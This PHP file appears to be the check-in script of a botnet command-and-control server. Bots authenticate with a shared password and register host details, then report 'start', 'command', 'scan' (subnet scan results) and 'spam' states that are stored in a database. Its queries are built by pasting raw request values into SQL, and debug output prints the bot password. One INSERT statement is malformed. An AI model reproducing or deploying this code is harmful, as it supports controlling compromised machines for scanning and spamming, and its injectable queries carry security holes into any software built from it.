<?php
include_once("./conexiondb.php");

//$mySQLlog="logs/sql.log";
//$mySQLlog="/var/log/httpd/sql.log";
//echo exec('whoami'); 
//$mySQLlog="/tmp/webapi/sql.log";

$mySQLlog="/var/www/html/api/sql.log";

//file:///path/to/file.ext
//$fh=fopen($mySQLlog,'w');
//echo $fh;
//fwrite($fh,"Inicio del server"."\n");
//fclose($fh);
			
//include_once("./includes/functions.php");
include_once("./functions.php");

$botinitialpwd=getDBParam("botInitialPwd");
//$botinitialpwd="hola";

//limpieza de los parametros que ingresan por HTTP
//$botpwd = filter_var($_POST['botpwd'],FILTER_SANITIZE_MAGIC_QUOTES);
//$status = filter_var($_POST['status'],FILTER_SANITIZE_MAGIC_QUOTES);
//$botid = filter_var($_POST['botid'],FILTER_SANITIZE_MAGIC_QUOTES);
//$hostname = filter_var($_POST['hostname'],FILTER_SANITIZE_MAGIC_QUOTES);
//$osname = filter_var($_POST['osname'],FILTER_SANITIZE_MAGIC_QUOTES);
//$osversion = filter_var($_POST['osversion'],FILTER_SANITIZE_MAGIC_QUOTES);
//$osarch = filter_var($_POST['osarch'],FILTER_SANITIZE_MAGIC_QUOTES);
//$hostuptime = filter_var($_POST['hostuptime'],FILTER_SANITIZE_MAGIC_QUOTES);
//$hostips = filter_var($_POST['hostips'],FILTER_SANITIZE_MAGIC_QUOTES);
//$tcpconnections = filter_var($_POST['tcpconnections'],FILTER_SANITIZE_MAGIC_QUOTES);
//$subnetscan = filter_var($_POST['subnetscan'],FILTER_SANITIZE_MAGIC_QUOTES);
//$smtpmode = filter_var($_POST['SMTPmode'],FILTER_SANITIZE_MAGIC_QUOTES);



//---------------------------------------------------
// sanidad de los parámetros que se reciben desde el exterior

//	$botpwd = filter_var($_GET['botpwd'],FILTER_SANITIZE_MAGIC_QUOTES);
if(empty($_GET['botpwd'])){	
	$botpwd=" ";
}else{
	$botpwd = filter_var($_GET['botpwd'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_GET['status'])){	
	$status=" ";
}else{
	$status = filter_var($_GET['status'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_GET['botid'])){	
	$botid=" ";
}else{
	$botid = filter_var($_GET['botid'],FILTER_SANITIZE_MAGIC_QUOTES);
}


if(empty($_GET['hostname'])){	
	$hostname=" ";
}else{
	$hostname = filter_var($_GET['hostname'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_GET['osname'])){	
	$osname=" ";
}else{
	$osname = filter_var($_GET['osname'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_GET['osversion'])){	
	$osversion=" ";
}else{
	$osversion = filter_var($_GET['osversion'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_GET['osarch'])){	
	$osarch=" ";
}else{
	$osarch = filter_var($_GET['osarch'],FILTER_SANITIZE_MAGIC_QUOTES);
}


if(empty($_GET['hostuptime'])){	
	$hostuptime=" ";
}else{
	$hostuptime = filter_var($_GET['hostuptime'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_GET['hostips'])){	
	$hostips=" ";
}else{
	$hostips = filter_var($_GET['hostips'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_GET['tcpconnections'])){	
	$tcpconnections=" ";
}else{
	$tcpconnections = filter_var($_GET['tcpconnections'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_GET['subnetscan'])){	
	$subnetscan=" ";
}else{
	$subnetscan = filter_var($_GET['subnetscan'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_GET['SMTPmode'])){	
	$smtpmode=" ";
}else{
	$smtpmode = filter_var($_GET['SMTPmode'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(getenv("HTTP_X_FORWARDED_FOR")){
	$proxysourceip=getenv("HTTP_X_FORWARDED_FOR");
}else{
	$proxysourceip=null;
}//fin HTTP_X_FORWARDED_FOR


//---------------------------------------------------
if(getenv("REMOTE_ADDR")){
	$sourceip=getenv("REMOTE_ADDR");
}else{
	$sourceip=null;
}//fin HTTP_X_FORWARDED_FOR


//--------------------------------------------------------
//------------------------------------------------------------
//Para debug se muestran los parametros recibidos en pantalla
//echo "sourceip ->".$sourceip."\n";
echo "<br>  recibido botpwd ->".$botpwd;
echo "<br>  status ->".$status;
echo "<br>  botId ->".$botid;
echo "<br>  hostname ->".$hostname;
echo "<br>  osname ->".$osname;
echo "<br>  osversion ->".$osversion;
echo "<br>  osarch ->".$osarch;
echo "<br>  hostuptime ->".$hostuptime;
echo "<br>  hostips ->".$hostips;
echo "<br>  tcpconnections ->".$tcpconnections;
echo "<br>  subnetscan ->".$subnetscan;
echo "<br>  SMTPmode ->".$smtpmode;
echo "<br>  proxysourceip ->".$proxysourceip;

echo "<br>  botInitialPwd ->".$botinitialpwd;
//------------------------------------------------------------




if($botpwd===$botinitialpwd){
	echo "<br> dentro de botpwd ";
	
//	$currentDirective=getDBParam("currentDirective");		
//	$initialResponse=getDBParam("initialResponse");
	
	$currentDirective="ninguna";		
//	$initialResponse="ninguna";
	
	if($status==="init"){
			$initialResponse="start";
		echo "<br> directiva inicial es ->".$initialResponse;	
	}elseif ($status==="start"){
		echo $sourceip;
//		echo mysql_real_escape_string($botid);
		$query="SELECT * FROM bots WHERE botid='$botid'";
		echo "<br> query=".$query;

		$result=$connectmysqli->query($query);		
//		fwrite($fh, $query."\n\r");
//		$result=mysql_query($query);	
	 echo "<br>".$result->num_rows."<br>";
	   if($result->num_rows<1){
			//arranca y carga como bot conectado//."','".$smtpmode."','".$tcpconnections
			$smtpmode="smtpmode";
			$tcpconnections="1";
			$query  = "INSERT INTO bots VALUES ('".$botid."','".$status."','".$hostname."','".$osname."','".$osversion."','".$osarch."','".$hostuptime."','".$hostips."','".$sourceip."',".$proxysourceip."'".$proxysourceip."'".",'".$smtpmode."','".$tcpconnections."',"."now(),now())";

			echo "<br> antes del insert query=".$query;						
			$result=$connectmysqli->query($query);
			echo "Table creation failed: (" . $connectmysqli->errno . ") " . $connectmysqli->error;			
									
		}//mysql_numrows($result)<1
		
	}elseif ($status==="command"){
		$query="SELECT botid FROM bots WHERE botid='".$botid."'";
		$result=$connectmysqli->query($query);		
		echo "<br> query=".$query;

	   if($result->num_rows<1){				
			//si no hay filas de ese bot, se lo reinicia
			echo "reset";
		}else{
			echo "<br> ".$currentDirective;
			//se pasa revision del agente y se actualiza
			$query="UPDATE bots set status='".$status."',hostuptime='".$hostuptime."',sourceip='".$sourceip."',proxysourceip='".$proxysourceip.
			"',smtpmode='".$smtpmode."',lastupdated=NOW(),tcpconnections='".$tcpconnections."' WHERE botid='".$botid."'";
			echo "<br> query=".$query;
			$result=$connectmysqli->query($query);
//			echo "Table creation failed: (" . $connectmysqli->errno . ") " . $connectmysqli->error;			
//			fwrite($fh,$query."\n\r");
			//$result=mysql_query($query);
		}//mysql_numrows($result)<1
	}elseif ($subnetscan !=NULL && $status ==="scan"){
		//echo "<br> ".$currenDirective;
		$query="UPDATE bots set
		status='".$status."',subnetscan='".$subnetscan."',lastupdated=NOW()
		WHERE botid='".$botid."'";
	   echo "<br> query=".$query;		
//		fwrite($fh,$query."\n\r");
//		$result=mysql_query($query);
	}elseif ($status==='spam'){
//		$file=file_get_contents("spamFactory/".$botID);
//		echo $file;
		echo "<br> estoy spameando";		
	}else{
		echo "parametro status vino vacio -> null";
		//header("Location: /404.html");
	} 
}elseif ($botpwd != $botinitialpwd){ //|| $botid==null){
//			header("Location: /404.html");
			echo "\n botInitialPwd es distinto del pass o botID es null \n";
}else{
	//codificar algo cuando el assword del bot no está 
	//establecido
	echo "<br> AL FINAL";
}






?>